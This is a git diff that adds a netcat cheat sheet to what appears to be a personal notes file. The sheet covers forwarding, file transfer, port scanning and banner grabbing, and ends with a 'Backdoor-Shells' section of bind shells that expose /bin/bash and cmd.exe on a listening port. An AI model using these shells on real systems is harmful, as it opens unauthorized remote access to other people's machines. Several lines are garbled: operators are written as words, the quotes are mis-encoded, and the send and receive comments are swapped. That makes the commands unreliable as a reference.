@@ -103,5 +103,34 @@ echo $( php -r "echo urlencode('Start: #1, Zeichen {13/24} Ende();');"; )
 echo $( php -r "echo urlencode(\"$1\");"; )
 urlencode.sh 'string zum encodieren'
 ```
-  
 
+
+NETCAT STUFF
+```bash
+# netcat stuff
+Netcat-Forwarding
+nc [host] [port] > relay.bat # forwarding
+
+nc -l -p [port] -e relay.bat # forwarding
+
+Netcat-Forwarding
+nc -l -p [port] 0 (less than) backpipe (pipe) nc [client IP] [port] (pipe) tee backpipe
+
+Netcat-Filetransfer
+nc [host] [port] (greater than) file_name.out # send a file
+
+nc [host] [port] (less than) file_name.in # receive a file
+
+Netcat-Port-Scanner
+nc -zv site.com 80 # scan port
+
+nc -zv hostname.com 80 84 # scan ports
+nc -zv site.com 80-84 # scan ports
+
+Netcat-Banner
+echo â€œâ€ | nc -zv -wl [host] [port range] grab banner
+
+Netcat-Backdoor-Shells
+nc -l -p [port] -e /bin/bash
+nc -l -p [port] -e cmd.exe
+```
